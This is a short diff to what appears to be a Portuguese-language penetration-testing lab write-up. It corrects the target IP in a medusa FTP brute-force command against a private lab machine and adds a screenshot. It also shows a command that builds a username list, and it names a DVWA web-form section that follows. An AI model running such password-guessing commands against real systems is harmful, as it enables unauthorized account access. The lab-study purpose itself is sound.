@@ -44,7 +44,11 @@ root
 ```
 echo-e 'user\nmsfadmin\admin\nroot' > users.txt 
 ```
-``` medusa -h 192.16.56.102 -U user.txt -P pass.txt -M ftp -t 6 ```
+``` medusa -h 192.168.56.102 -U user.txt -P pass.txt -M ftp -t 6 ```
+
+
+<img width="772" height="633" alt="medusa_ftp" src="https://github.com/user-attachments/assets/c37e013a-26d5-44bf-b79b-27d4da3c5588" />
+
 
 
 ## Automação de tentativas em formulário web (DVWA) 
